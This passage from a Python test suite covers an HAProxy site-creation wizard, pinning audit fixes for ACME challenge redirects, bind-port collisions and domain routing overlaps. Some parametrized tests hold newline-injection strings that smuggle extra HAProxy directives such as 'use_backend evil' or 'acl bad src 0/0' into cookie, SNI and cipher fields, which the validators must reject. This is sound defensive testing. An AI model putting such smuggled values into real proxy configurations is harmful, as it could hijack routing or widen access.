        "Bulgu #29: auto-generated https_redirect must exclude the "
        "ACME HTTP-01 challenge path so LE validation can hit the "
        "agent's _acme_challenge_backend before falling through to "
        "the redirect."
    )
    assert "!{ path_beg /.well-known/acme-challenge/ }" in cond, (
        "Bulgu #29: the exclusion must use HAProxy's path_beg ACL "
        "fetch (anonymous ACL form) — anything else either fails to "
        "parse or matches the wrong tokens."
    )


def test_bulgu29_renderer_accepts_new_multi_clause_condition():
    """`_format_redirect_rule` must accept the new multi-clause
    condition without garbling the `if` keyword. Pre-fix the helper's
    `if`-prepend logic was only tested against single-clause
    conditions; the new path_beg exclusion exercises the
    `condition.lstrip().lower()` startswith() branch."""
    import importlib.util
    spec = importlib.util.spec_from_file_location(
        "_haproxy_cfg_b29",
        _BACKEND_DIR / "services/haproxy_config.py",
    )
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    line = mod._format_redirect_rule({
        "type": "scheme", "scheme": "https", "code": 301,
        "condition": "!{ ssl_fc } !{ path_beg /.well-known/acme-challenge/ }",
    })
    assert line is not None
    # No double `if`, no missing `if`
    assert line.count(" if ") == 1, (
        "Bulgu #29: rendered redirect must have EXACTLY one `if ` "
        f"clause separator; got {line!r}"
    )
    assert "if !{ ssl_fc } !{ path_beg /.well-known/acme-challenge/ }" in line


def test_bulgu29_static_marker_in_router():
    """Static-source pin: the auto-generated redirect helper must
    keep the round-13 audit marker so a future refactor doesn't
    silently revert to the bare `!{ ssl_fc }` condition."""
    from pathlib import Path
    src = _backend_src("routers/site_wizard.py")
    assert "Bulgu #29 (round-13 audit)" in src, (
        "Bulgu #29: _build_redirect_rules helper missing the round-13 "
        "audit marker (the ACME challenge exclusion was reverted)."
    )
    assert "/.well-known/acme-challenge/" in src, (
        "Bulgu #29: _build_redirect_rules must encode the ACME "
        "challenge path exclusion literal."
    )


# ---- Bulgu #30: explicit scheme=https redirect_rules under ACME ----


def _bulgu30_site_kwargs(**overrides):
    base = {
        "cluster_id": 1,
        "domains": ["www.example.com"],
        "backend": {"name": "be"},
        "servers": [{
            "server_name": "s1", "server_address": "10.0.0.1",
            "server_port": 80,
        }],
        "frontend": {"name": "fe", "bind_port": 80},
        "ssl": {"mode": "acme"},
        "apply_immediately": True,
    }
    base.update(overrides)
    return base


def test_bulgu30_rejects_explicit_scheme_redirect_under_acme():
    """ssl.mode='acme' + an operator-typed scheme=https redirect with
    no ACME-challenge exclusion is a self-defeating config — LE's
    HTTP-01 validator would hit a 301 to a non-existent HTTPS
    endpoint. Reject at the model boundary."""
    from models.site_wizard import SiteCreate
    kwargs = _bulgu30_site_kwargs(
        frontend={
            "name": "fe", "bind_port": 80,
            "https_redirect": False,
            "redirect_rules": [{
                "type": "scheme", "scheme": "https", "code": 301,
                "condition": "!{ ssl_fc }",
            }],
        },
    )
    with pytest.raises(ValidationError) as exc_info:
        SiteCreate(**kwargs)
    msg = str(exc_info.value)
    assert "acme" in msg.lower()
    assert "scheme" in msg.lower()
    assert "acme-challenge" in msg.lower() or "well-known" in msg.lower()


def test_bulgu30_rejects_unconditional_scheme_redirect_under_acme():
    """An explicit scheme=https redirect with NO condition (always
    fires) is even worse — it 301s every request including the LE
    validator. Must be rejected."""
    from models.site_wizard import SiteCreate
    kwargs = _bulgu30_site_kwargs(
        frontend={
            "name": "fe", "bind_port": 80,
            "https_redirect": False,
            "redirect_rules": [{
                "type": "scheme", "scheme": "https", "code": 301,
            }],
        },
    )
    with pytest.raises(ValidationError):
        SiteCreate(**kwargs)


def test_bulgu30_accepts_scheme_redirect_with_acme_exclusion():
    """An operator who manually encodes the ACME-challenge exclusion
    in their condition knows what they're doing — accept the rule
    as-is."""
    from models.site_wizard import SiteCreate
    kwargs = _bulgu30_site_kwargs(
        frontend={
            "name": "fe", "bind_port": 80,
            "https_redirect": False,
            "redirect_rules": [{
                "type": "scheme", "scheme": "https", "code": 301,
                "condition": (
                    "!{ ssl_fc } "
                    "!{ path_beg /.well-known/acme-challenge/ }"
                ),
            }],
        },
    )
    SiteCreate(**kwargs)  # must not raise


def test_bulgu30_rejects_string_form_scheme_redirect_under_acme():
    """Legacy raw-string redirect_rules entries must be checked
    too. An operator who types `scheme https if !{ ssl_fc }`
    bypasses the dict-shape check; catch them in the string branch."""
    from models.site_wizard import SiteCreate
    kwargs = _bulgu30_site_kwargs(
        frontend={
            "name": "fe", "bind_port": 80,
            "https_redirect": False,
            "redirect_rules": ["scheme https code 301 if !{ ssl_fc }"],
        },
    )
    with pytest.raises(ValidationError):
        SiteCreate(**kwargs)


def test_bulgu30_accepts_location_redirect_under_acme():
    """A `redirect_rules` entry with type='location' (a normal HTTP
    L7 redirect, NOT a TLS upgrade) must still be allowed under ACME
    mode. Pre-fix would over-block this legitimate case."""
    from models.site_wizard import SiteCreate
    kwargs = _bulgu30_site_kwargs(
        frontend={
            "name": "fe", "bind_port": 80,
            "https_redirect": False,
            "redirect_rules": [{
                "type": "location",
                "location": "/new",
                "code": 302,
                "condition": "",
            }],
        },
    )
    SiteCreate(**kwargs)  # must not raise


def test_bulgu30_accepts_explicit_scheme_redirect_under_upload_mode():
    """ssl.mode='upload' creates the HTTPS frontend at submit time,
    so the LE HTTP-01 self-defeat does NOT apply — the scheme=https
    redirect is the standard HTTP→HTTPS bounce and must pass even
    without the ACME-challenge exclusion."""
    from models.site_wizard import SiteCreate
    base = _bulgu30_site_kwargs(
        frontend={
            "name": "fe", "bind_port": 80,
            "https_redirect": False,
            "redirect_rules": [{
                "type": "scheme", "scheme": "https", "code": 301,
                "condition": "!{ ssl_fc }",
            }],
        },
        ssl={
            "mode": "upload", "name": "stub-cert",
            "certificate_content": (
                "-----BEGIN CERTIFICATE-----\nstub\n-----END CERTIFICATE-----"
            ),
            "private_key_content": (
                "-----BEGIN PRIVATE KEY-----\nstub\n-----END PRIVATE KEY-----"
            ),
        },
        apply_immediately=False,
    )
    SiteCreate(**base)  # must not raise


def test_bulgu30_static_marker():
    """Static-source pin: the ACME explicit-redirect guard must remain
    in SiteCreate.enforce_acme_apply_and_http."""
    from pathlib import Path
    src = _backend_src("models/site_wizard.py")
    assert "Bulgu #30 (round-13 audit)" in src, (
        "Bulgu #30: ACME-mode explicit scheme=https redirect guard "
        "marker missing from site_wizard.py"
    )


# ---- Bulgu #31: post_completion_actions must verify default_backend exists ----


def test_bulgu31_static_marker_in_letsencrypt_router():
    """Static-source pin: the post-completion `default_backend`
    existence guard must remain in `_execute_post_completion_actions`.
    Pre-fix the helper happily inserted an HTTPS frontend with
    `default_backend='be_dead'` if the wizard's bulk-create version
    had been rejected — and HAProxy then refused to load the config
    with "frontend X references unknown backend 'be_dead'"."""
    from pathlib import Path
    src = _backend_src("routers/letsencrypt.py")
    assert "Bulgu #31 (round-13 audit)" in src, (
        "Bulgu #31: post_completion backend-existence guard marker "
        "missing from letsencrypt.py"
    )
    # The actual SQL probe must be present so the marker is not just
    # a stale comment over removed code.
    assert (
        'SELECT id FROM backends' in src and
        "cluster_id = $1 AND name = $2" in src
    ), (
        "Bulgu #31: post_completion guard must SELECT from backends "
        "by (cluster_id, name) — query reverted?"
    )
    # The error path must record an event so the operator can see
    # WHY the post-completion silently no-op'd.
    assert "backend_missing" in src, (
        "Bulgu #31: missing-backend error code marker missing"
    )


# ---- Bulgu #32: preview must surface cluster.acme_enabled=false ----


def test_bulgu32_static_marker_in_preview():
    """Static-source pin: the preview helper must emit a warning when
    the target cluster has acme_enabled=false. Pre-fix the wizard
    rendered a clean dry-run and only blew up at submit (400)."""
    from pathlib import Path
    src = _backend_src("routers/site_wizard.py")
    assert "Bulgu #32 (round-13 audit)" in src, (
        "Bulgu #32: preview cluster.acme_enabled warning marker "
        "missing from routers/site_wizard.py"
    )
    # The actual SQL probe must be present so the marker is not just
    # a stale comment over removed code.
    assert "SELECT acme_enabled FROM haproxy_clusters WHERE id" in src, (
        "Bulgu #32: preview must SELECT acme_enabled from haproxy_clusters"
    )


# ============================================================================
# Round 14 — single-line-value newline / whitespace injection (Bulgu #33)
# ============================================================================


# ---- Bulgu #33-A: ServerStep cookie_value / ssl_sni / ssl_ciphers ----


@pytest.mark.parametrize("field,bad", [
    ("cookie_value", "srv1\n    use_backend evil if always"),
    ("cookie_value", "srv1\r    server x 8.8.8.8:80"),
    ("ssl_sni", "example.com\n    acl is_evil src 10.0.0.0/8"),
    ("ssl_sni", "example.com\r\nacl bad src 0/0"),
    ("ssl_ciphers", "ECDHE-RSA:AES128\n    use_backend rogue if always"),
    ("ssl_ciphers", "ECDHE\r\nacl x src 0/0"),
])
def test_bulgu33_server_field_rejects_newline(field, bad):
    """ServerStep single-line value fields must reject embedded
    newlines so operators cannot smuggle additional HAProxy directives
    into the rendered backend block."""
    from models.site_wizard import ServerStep
    kwargs = {
        "server_name": "srv1",
        "server_address": "10.0.0.1",
        "server_port": 80,
        field: bad,
    }
    with pytest.raises(ValidationError) as exc_info:
        ServerStep(**kwargs)
    assert field in str(exc_info.value)


def test_bulgu33_server_ssl_sni_rejects_embedded_whitespace():
    """ssl_sni is a single hostname; HAProxy's server-line tokenizer
    splits at the first space, so an embedded space would shift
    `ciphers`/`inter`/`check` into the wrong positions."""
    from models.site_wizard import ServerStep
    with pytest.raises(ValidationError) as exc_info:
        ServerStep(
            server_name="srv1",
            server_address="10.0.0.1",
            server_port=80,
            ssl_sni="evil host name",
        )
    assert "ssl_sni" in str(exc_info.value)
    assert "whitespace" in str(exc_info.value).lower()


@pytest.mark.parametrize("field,good", [
    ("cookie_value", "srv1"),
    ("cookie_value", "abc-123_xyz"),
    ("ssl_sni", "example.com"),
    ("ssl_sni", "api.internal.corp"),
    ("ssl_ciphers", "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384"),
    ("ssl_ciphers", "ECDHE-RSA-AES128-GCM-SHA256:!aNULL:!MD5"),
])
def test_bulgu33_server_field_accepts_legitimate_values(field, good):
    """Legitimate single-line values must continue to pass — the
    validator only rejects newlines (and whitespace inside ssl_sni)."""
    from models.site_wizard import ServerStep
    kwargs = {
        "server_name": "srv1",
        "server_address": "10.0.0.1",
        "server_port": 80,
        field: good,
    }
    obj = ServerStep(**kwargs)
    assert getattr(obj, field) == good


def test_bulgu33_server_field_none_passes():
    """None must coerce through without raising."""
    from models.site_wizard import ServerStep
    obj = ServerStep(
        server_name="srv1",
        server_address="10.0.0.1",
        server_port=80,
        cookie_value=None,
        ssl_sni=None,
        ssl_ciphers=None,
    )
    assert obj.cookie_value is None
    assert obj.ssl_sni is None
    assert obj.ssl_ciphers is None


# ---- Bulgu #33-B: SSLChoice ssl_npn / ssl_ciphers / ssl_ciphersuites ----


@pytest.mark.parametrize("field,bad", [
    ("ssl_ciphers", "ECDHE-RSA-AES128\n    use_backend evil"),
    ("ssl_ciphers", "ECDHE AES128"),  # embedded space
    ("ssl_ciphers", "ECDHE\r\nacl x src 0/0"),
    ("ssl_ciphersuites", "TLS_AES_128_GCM_SHA256\n    http-request deny"),
    ("ssl_ciphersuites", "TLS_AES_128 TLS_CHACHA20"),  # space
])
def test_bulgu33_ssl_choice_rejects_injection(field, bad):
    """SSLChoice bind-line value fields must reject newlines and
    embedded whitespace so the rendered `bind ... <kw> <value>`
    cannot be hijacked."""
    from models.site_wizard import SSLChoice
    with pytest.raises(ValidationError):
        SSLChoice(mode="none", **{field: bad})


@pytest.mark.parametrize("field,good", [
    ("ssl_ciphers", "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384"),
    ("ssl_ciphers", "ECDHE-RSA-AES128-GCM-SHA256:!aNULL:!MD5"),
    ("ssl_ciphersuites", "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256"),
])
def test_bulgu33_ssl_choice_accepts_legitimate_values(field, good):
    """Legitimate bind values must pass."""
    from models.site_wizard import SSLChoice
    obj = SSLChoice(mode="none", **{field: good})
    assert getattr(obj, field)


def test_bulgu33_ssl_choice_none_and_empty_pass():
    """None and empty strings must coerce to None (no bind directive
    emitted) without raising."""
    from models.site_wizard import SSLChoice
    obj = SSLChoice(
        mode="none",
        ssl_ciphers=None, ssl_ciphersuites=None,
    )
    assert obj.ssl_ciphers is None
    assert obj.ssl_ciphersuites is None
    obj = SSLChoice(
        mode="none",
        ssl_ciphers="", ssl_ciphersuites="",
    )
    assert obj.ssl_ciphers is None
    assert obj.ssl_ciphersuites is None


def test_bulgu33_static_marker():
    """Static-source pin: the round-14 single-line value validators
    must remain in site_wizard.py."""
    from pathlib import Path
    src = _backend_src("models/site_wizard.py")
    assert "Bulgu #33 (round-14 audit)" in src, (
        "Bulgu #33: single-line value injection guards missing from "
        "site_wizard.py"
    )
    # Both validator function names must be present so a future
    # refactor does not silently drop the guard.
    assert "_validate_single_line_server_value" in src, (
        "Bulgu #33-A: ServerStep newline/whitespace guard reverted?"
    )
    assert "_validate_ssl_cipher_list" in src, (
        "Bulgu #33-B: ssl_ciphers / ssl_ciphersuites guard reverted?"
    )


# ============================================================================
# Round 15 — multi-tenant ACME UX (Bulgu #34, #35, #36)
# ============================================================================


# ---- Bulgu #34 — cluster-aware ACME bind_port=80 relaxation ----


def test_bulgu34_model_allows_non_80_acme_bind_port():
    """Pre-fix the model-level validator rejected ACME payloads with
    `frontend.bind_port != 80` outright. That blanket rule didn't fit
    the canonical enterprise pattern (one shared port-80 frontend
    host-routing many sites). The cluster-aware reachability check
    has been moved to the route handler where DB lookups are
    available; the model layer no longer blocks based on bind_port."""
    from models.site_wizard import SiteCreate
    SiteCreate(
        cluster_id=1,
        domains=["www.example.com"],
        backend={"name": "be"},
        servers=[{
            "server_name": "s1", "server_address": "10.0.0.1",
            "server_port": 80,
        }],
        frontend={"name": "fe", "bind_port": 8080, "mode": "http"},
        ssl={"mode": "acme"},
        apply_immediately=True,
    )


def test_bulgu34_model_still_rejects_acme_without_apply_immediately():
    """The other ACME invariants (apply_immediately, http mode) must
    remain enforced at the model layer — only the bind_port=80 rule
    was relaxed."""
    from models.site_wizard import SiteCreate
    with pytest.raises(ValidationError, match="apply_immediately"):
        SiteCreate(
            cluster_id=1,
            domains=["www.example.com"],
            backend={"name": "be"},
            servers=[{
                "server_name": "s1", "server_address": "10.0.0.1",
                "server_port": 80,
            }],
            frontend={"name": "fe", "bind_port": 80, "mode": "http"},
            ssl={"mode": "acme"},
            apply_immediately=False,
        )


def test_bulgu34_model_still_rejects_acme_with_tcp_frontend():
    """ACME mode requires frontend.mode='http' regardless of port —
    HAProxy can't read the Host header (let alone the path) on a TCP
    frontend, so HTTP-01 is impossible."""
    from models.site_wizard import SiteCreate
    with pytest.raises(ValidationError, match="frontend.mode='http'"):
        SiteCreate(
            cluster_id=1,
            domains=["www.example.com"],
            backend={"name": "be", "mode": "tcp"},
            servers=[{
                "server_name": "s1", "server_address": "10.0.0.1",
                "server_port": 80,
            }],
            frontend={"name": "fe", "bind_port": 80, "mode": "tcp"},
            ssl={"mode": "acme"},
            apply_immediately=True,
        )


def test_bulgu34_helper_passes_when_bind_port_is_80():
    """`_validate_acme_port80_reachable` returns None when the
    wizard's new frontend is itself on port 80 — the new frontend
    will serve the challenge (no extra cluster scan needed)."""
    import asyncio
    from routers.site_wizard import _validate_acme_port80_reachable
    from models.site_wizard import SiteCreate

    body = SiteCreate(
        cluster_id=1,
        domains=["www.example.com"],
        backend={"name": "be"},
        servers=[{
            "server_name": "s1", "server_address": "10.0.0.1",
            "server_port": 80,
        }],
        frontend={"name": "fe", "bind_port": 80, "mode": "http"},
        ssl={"mode": "acme"},
        apply_immediately=True,
    )

    class _StubConn:
        async def fetch(self, *args, **kwargs):  # never called when port==80
            raise AssertionError(
                "_validate_acme_port80_reachable must not hit the DB "
                "when bind_port==80"
            )

    result = asyncio.run(
        _validate_acme_port80_reachable(_StubConn(), body)
    )
    assert result is None


def test_bulgu34_helper_passes_for_non_acme_modes():
    """The helper short-circuits to None for any non-acme SSL mode."""
    import asyncio
    from routers.site_wizard import _validate_acme_port80_reachable
    from models.site_wizard import SiteCreate

    body = SiteCreate(
        cluster_id=1,
        domains=["www.example.com"],
        backend={"name": "be"},
        servers=[{
            "server_name": "s1", "server_address": "10.0.0.1",
            "server_port": 80,
        }],
        frontend={"name": "fe", "bind_port": 8080, "mode": "http"},
        ssl={"mode": "none"},
        apply_immediately=False,
    )

    class _StubConn:
        async def fetch(self, *args, **kwargs):
            raise AssertionError(
                "_validate_acme_port80_reachable must not hit the DB "
                "when ssl.mode is not 'acme'"
            )

    result = asyncio.run(
        _validate_acme_port80_reachable(_StubConn(), body)
    )
    assert result is None


def test_bulgu34_helper_returns_error_when_no_port80_frontend():
    """When the wizard's new frontend is on a non-80 port AND the
    cluster has no existing port-80 HTTP frontend, the helper
    returns a human-readable error explaining the three options."""
    import asyncio
    from routers.site_wizard import _validate_acme_port80_reachable
    from models.site_wizard import SiteCreate

    body = SiteCreate(
        cluster_id=1,
        domains=["www.example.com"],
        backend={"name": "be"},
        servers=[{
            "server_name": "s1", "server_address": "10.0.0.1",
            "server_port": 80,
        }],
        frontend={"name": "fe", "bind_port": 8080, "mode": "http"},
        ssl={"mode": "acme"},
        apply_immediately=True,
    )

    class _StubConnEmpty:
        async def fetch(self, *args, **kwargs):
            return []

    err = asyncio.run(
        _validate_acme_port80_reachable(_StubConnEmpty(), body)
    )
    assert err is not None
    assert "port-80" in err.lower() or "port 80" in err.lower()
    # Message must offer the three concrete paths forward.
    assert "bind_port=80" in err
    assert "shared port-80" in err.lower() or "ssl.mode" in err


def test_bulgu34_helper_allows_non_80_when_cluster_has_port80_http_frontend():
    """When the cluster ALREADY has a port-80 HTTP frontend, the
    wizard's new frontend can bind any free port — the cluster's
    existing frontend will serve the LE HTTP-01 challenge for
    the new domain."""
    import asyncio
    from routers.site_wizard import _validate_acme_port80_reachable
    from models.site_wizard import SiteCreate

    body = SiteCreate(
        cluster_id=1,
        domains=["www.example.com"],
        backend={"name": "be"},
        servers=[{
            "server_name": "s1", "server_address": "10.0.0.1",
            "server_port": 80,
        }],
        frontend={"name": "fe-new", "bind_port": 8080, "mode": "http"},
        ssl={"mode": "acme"},
        apply_immediately=True,
    )

    class _Row(dict):
        def __getitem__(self, k):  # asyncpg.Record style accessor
            return dict.__getitem__(self, k)

    class _StubConnHasPort80:
        async def fetch(self, *args, **kwargs):
            return [_Row({
                "id": 522,
                "name": "fe-shared-http",
                "bind_address": "*",
                "bind_port": 80,
                "mode": "http",
            })]

    err = asyncio.run(
        _validate_acme_port80_reachable(_StubConnHasPort80(), body)
    )
    assert err is None, (
        f"Bulgu #34: cluster with port-80 HTTP frontend must allow "
        f"the wizard's new non-80 ACME frontend, got error: {err}"
    )


def test_bulgu34_static_marker():
    """Static-source pin: the round-15 cluster-aware ACME reachability
    helper must remain. Pre-fix the model-level `bind_port=80` block
    was unconditional; the relaxation only makes sense if the route
    handler still calls the cluster-aware helper."""
    from pathlib import Path
    src = _backend_src("models/site_wizard.py")
    assert "Bulgu #34 (round-15 audit)" in src, (
        "Bulgu #34: ACME bind_port=80 relaxation marker missing "
        "from models/site_wizard.py"
    )
    router_src = _backend_src("routers/site_wizard.py")
    assert "_validate_acme_port80_reachable" in router_src, (
        "Bulgu #34: cluster-aware reachability helper missing from "
        "routers/site_wizard.py"
    )
    assert "_find_cluster_port80_http_frontend" in router_src, (
        "Bulgu #34: port-80 frontend lookup helper missing from "
        "routers/site_wizard.py"
    )


# ---- Bulgu #35 — actionable collision messages ----


def test_bulgu35_http_collision_message_offers_three_paths_for_acme():
    """When the colliding bind is the default HTTP port (80) and the
    operator picked ACME, the message must offer all three workflows:
    (a) change wizard's bind port, (b) extend the existing frontend
    with a host-based rule, (c) switch ssl.mode."""
    from routers.site_wizard import _explain_bind_collision
    msg = _explain_bind_collision(
        bind_address="*",
        bind_port=80,
        colliding_frontend_id=522,
        ssl_mode="acme",
        is_https=False,
    )
    assert "522" in msg
    assert "frontend.bind_port" in msg  # path (a)
    assert "Frontends UI" in msg or "host-based" in msg  # path (b)
    assert "ssl.mode" in msg  # path (c)


def test_bulgu35_https_collision_message_omits_acme_workaround():
    """Default-HTTPS-port collision shouldn't suggest switching
    ssl.mode — the user already committed to HTTPS by definition
    (no SSL mode would create an HTTPS frontend that collides on
    :443). It should still offer port change + extend-existing
    workflows."""
    from routers.site_wizard import _explain_bind_collision
    msg = _explain_bind_collision(
        bind_address="*",
        bind_port=443,
        colliding_frontend_id=523,
        ssl_mode="upload",
        is_https=True,
    )
    assert "523" in msg
    assert "https_bind_port" in msg  # path (a) for HTTPS
    assert "Frontends UI" in msg or "host-based" in msg  # path (b)


def test_bulgu35_non_default_port_collision_message_simple():
    """A collision on a non-default port (e.g. 9080) doesn't get the
    'on ACME mode' carve-out — the message keeps the change-port and
    extend-existing options without the port-80 nuance."""
    from routers.site_wizard import _explain_bind_collision
    msg = _explain_bind_collision(
        bind_address="*",
        bind_port=9080,
        colliding_frontend_id=300,
        ssl_mode="none",
        is_https=False,
    )
    assert "9080" in msg
    assert "different bind port" in msg
    assert "Frontends UI" in msg or "host-based" in msg


def test_bulgu35_static_marker():
    """Static-source pin: the round-15 actionable collision helper
    must remain in the router."""
    src = _backend_src("routers/site_wizard.py")
    assert "Bulgu #35 (round-15 audit)" in src, (
        "Bulgu #35: actionable collision-message marker missing "
        "from routers/site_wizard.py"
    )
    assert "_explain_bind_collision" in src, (
        "Bulgu #35: collision-message helper reverted?"
    )


# ---- Bulgu #36 — preview surfaces blocking errors explicitly ----


def test_bulgu36_static_marker_in_preview():
    """Static-source pin: preview helper must populate the new
    `blocking_errors` envelope and the SiteWizard frontend must read
    it so Create stays disabled while collisions exist."""
    src = _backend_src("routers/site_wizard.py")
    assert "Bulgu #36 (round-15 audit)" in src, (
        "Bulgu #36: preview blocking-errors marker missing from "
        "routers/site_wizard.py"
    )
    assert '"blocking_errors"' in src, (
        "Bulgu #36: preview response envelope missing the "
        "blocking_errors key"
    )
    # Frontend integration pin (skipped in CI without frontend tree).
    frontend_path = _BACKEND_DIR.parent / "frontend/src/components/SiteWizard.js"
    if not frontend_path.exists():
        pytest.skip(
            "frontend source tree not available; covered by monorepo runs"
        )
    fe_src = frontend_path.read_text()
    assert "blocking_errors" in fe_src, (
        "Bulgu #36: SiteWizard.js must consume previewResults."
        "blocking_errors to gate the Create button"
    )
    assert "previewBlocksSubmit" in fe_src, (
        "Bulgu #36: SiteWizard.js must define previewBlocksSubmit "
        "gating flag"
    )


# ============================================================================
# Round 16 — Multi-domain & multi-user enterprise scenarios (Bulgu #37-#42)
# ============================================================================


# ---- Bulgu #37 — cross-frontend domain ACL collision detection ----


def test_bulgu37_extract_host_values_basic():
    """Coarse parser must extract host values from the common
    `acl host_x hdr(host) -i a.com b.com` form."""
    from routers.site_wizard import _extract_host_values_from_acl
    assert _extract_host_values_from_acl(
        "host_x hdr(host) -i example.com www.example.com"
    ) == ["example.com", "www.example.com"]


def test_bulgu37_extract_host_values_lower_filter():
    """Parser must handle `hdr(host),lower` converter syntax."""
    from routers.site_wizard import _extract_host_values_from_acl
    assert _extract_host_values_from_acl(
        "host_x hdr(host),lower example.com"
    ) == ["example.com"]


def test_bulgu37_extract_host_values_req_hdr_alias():
    """Parser must recognise the `req.hdr(host)` alias."""
    from routers.site_wizard import _extract_host_values_from_acl
    assert _extract_host_values_from_acl(
        "host_x req.hdr(host) -i example.com"
    ) == ["example.com"]


def test_bulgu37_extract_host_values_stops_at_if_keyword():
    """`if`, `unless`, `or`, `and` must terminate the value list so
    operator-typed full directives don't get misparsed."""
    from routers.site_wizard import _extract_host_values_from_acl
    # The HAProxy ACL grammar puts `if`/`unless` after the values; the
    # parser stops at them.
    assert _extract_host_values_from_acl(
        "host_x hdr(host) -i example.com unless something_else"
    ) == ["example.com"]


def test_bulgu37_extract_host_values_handles_quotes():
    """Operators sometimes quote domains — the parser must strip them."""
    from routers.site_wizard import _extract_host_values_from_acl
    assert _extract_host_values_from_acl(
        'host_x hdr(host) -i "quoted.com" \'apos.com\''
    ) == ["quoted.com", "apos.com"]


def test_bulgu37_extract_host_values_non_host_acl_returns_empty():
    """ACLs that don't touch the host header must return [] so they
    don't get flagged as collisions."""
    from routers.site_wizard import _extract_host_values_from_acl
    assert _extract_host_values_from_acl(
        "is_api path_beg /api"
    ) == []
    assert _extract_host_values_from_acl(
        "is_internal src 10.0.0.0/8"
    ) == []


def test_bulgu37_extract_host_values_handles_empty_input():
    """Defensive: None / empty string / non-string must return []."""
    from routers.site_wizard import _extract_host_values_from_acl
    assert _extract_host_values_from_acl("") == []
    assert _extract_host_values_from_acl(None) == []  # type: ignore[arg-type]
    assert _extract_host_values_from_acl(123) == []  # type: ignore[arg-type]


def test_bulgu37_find_collisions_returns_overlap():
    """When an existing frontend's ACL claims one of the new domains,
    the helper returns the full row describing the conflict."""
    import asyncio
    from routers.site_wizard import _find_cluster_domain_routing_collisions

    class _Row(dict):
        def __getitem__(self, k):
            return dict.__getitem__(self, k)

    class _StubConn:
        async def fetch(self, *args, **kwargs):
            return [_Row({
                "id": 99,
                "name": "fe-existing",
                "acl_rules": [
                    "host_existing hdr(host) -i example.com www.example.com",
                    "is_api path_beg /api",
                ],
            })]

    out = asyncio.run(
        _find_cluster_domain_routing_collisions(
            _StubConn(), cluster_id=1,
            domains=["www.example.com", "newsite.com"],
            exclude_frontend_name="fe-new",
        )
    )
    assert len(out) == 1
    assert out[0]["frontend_id"] == 99
    assert out[0]["frontend_name"] == "fe-existing"
    assert out[0]["conflicting_domains"] == ["www.example.com"]


def test_bulgu37_find_collisions_handles_jsonb_string_form():
    """Some asyncpg configurations return JSONB as a string rather
    than a Python list. The helper must json-decode in that case."""
    import asyncio
    from routers.site_wizard import _find_cluster_domain_routing_collisions

    class _Row(dict):
        def __getitem__(self, k):
            return dict.__getitem__(self, k)

    class _StubConn:
        async def fetch(self, *args, **kwargs):
            return [_Row({
                "id": 99,
                "name": "fe-existing",
                "acl_rules": json.dumps(
                    ["host_x hdr(host) -i example.com"]
                ),
            })]

    out = asyncio.run(
        _find_cluster_domain_routing_collisions(
            _StubConn(), cluster_id=1,
            domains=["example.com"],
        )
    )
    assert len(out) == 1
    assert out[0]["conflicting_domains"] == ["example.com"]


def test_bulgu37_find_collisions_empty_when_no_overlap():
    """No overlap → empty list (NOT None)."""
    import asyncio
    from routers.site_wizard import _find_cluster_domain_routing_collisions

    class _Row(dict):
        def __getitem__(self, k):
            return dict.__getitem__(self, k)

    class _StubConn:
        async def fetch(self, *args, **kwargs):
            return [_Row({
                "id": 99,
                "name": "fe-existing",
                "acl_rules": ["host_other hdr(host) -i other.com"],
            })]

    out = asyncio.run(
        _find_cluster_domain_routing_collisions(
            _StubConn(), cluster_id=1, domains=["different.com"],
        )
    )
    assert out == []


def test_bulgu37_find_collisions_empty_domains_short_circuit():
    """An empty domain list returns [] without touching the DB."""
    import asyncio
    from routers.site_wizard import _find_cluster_domain_routing_collisions

    class _StubConn:
        async def fetch(self, *args, **kwargs):
            raise AssertionError("must not hit DB with empty domains")

    out = asyncio.run(
        _find_cluster_domain_routing_collisions(
            _StubConn(), cluster_id=1, domains=[],
        )
    )
    assert out == []


# ---- Bulgu #38 — pending ACME order overlap detection ----


def test_bulgu38_find_pending_acme_overlap_returns_overlap():
    """When an open LE order already covers any of the wizard's
    domains, the helper returns the full row with order_id, status,
    overlapping_domains, created_at."""
    import asyncio
    from routers.site_wizard import _find_pending_acme_order_overlap

    class _Row(dict):
        def __getitem__(self, k):
            return dict.__getitem__(self, k)

    class _StubConn:
        async def fetch(self, *args, **kwargs):
            return [_Row({
                "id": 42,
                "status": "wizard_staged",
                "domains": ["example.com", "www.example.com"],
                "created_at": "2025-12-01T10:00:00",
            })]

    out = asyncio.run(
        _find_pending_acme_order_overlap(
            _StubConn(), domains=["www.example.com", "newsite.com"],
        )
    )
    assert len(out) == 1
    assert out[0]["order_id"] == 42
    assert out[0]["status"] == "wizard_staged"
    assert out[0]["overlapping_domains"] == ["www.example.com"]


def test_bulgu38_find_pending_acme_overlap_empty_domains():
    """Empty domain list short-circuits to [] without DB hit."""
    import asyncio
    from routers.site_wizard import _find_pending_acme_order_overlap

    class _StubConn:
        async def fetch(self, *args, **kwargs):
            raise AssertionError("must not hit DB with empty domains")

    out = asyncio.run(
        _find_pending_acme_order_overlap(_StubConn(), domains=[])
    )
    assert out == []


def test_bulgu38_find_pending_acme_overlap_no_match_returns_empty():
    """When no open order overlaps, return []."""
    import asyncio
    from routers.site_wizard import _find_pending_acme_order_overlap

    class _StubConn:
        async def fetch(self, *args, **kwargs):
            return []  # query already filtered by SQL

    out = asyncio.run(
        _find_pending_acme_order_overlap(
            _StubConn(), domains=["nobody-has-this.example"],
        )
    )
    assert out == []


def test_bulgu38_find_pending_acme_overlap_handles_jsonb_string():
    """JSONB-as-string variant must be json-decoded."""
    import asyncio
    from routers.site_wizard import _find_pending_acme_order_overlap

    class _Row(dict):
        def __getitem__(self, k):
            return dict.__getitem__(self, k)

    class _StubConn:
        async def fetch(self, *args, **kwargs):
            return [_Row({
                "id": 7,
                "status": "pending",
                "domains": json.dumps(["a.com"]),
                "created_at": None,
            })]

    out = asyncio.run(
        _find_pending_acme_order_overlap(_StubConn(), domains=["a.com"])
    )
    assert out and out[0]["order_id"] == 7


# ---- Bulgu #39 — non-default port URL reachability hint ----


def test_bulgu39_reachable_urls_default_ports_use_bare_form():
    """Default ports (80/443) emit bare URLs without `:port`."""
    from routers.site_wizard import _describe_reachable_urls
    from models.site_wizard import SiteCreate

    body = SiteCreate(
        cluster_id=1, domains=["example.com"],
        backend={"name": "be"},
        servers=[{"server_name": "s", "server_address": "10.0.0.1", "server_port": 80}],
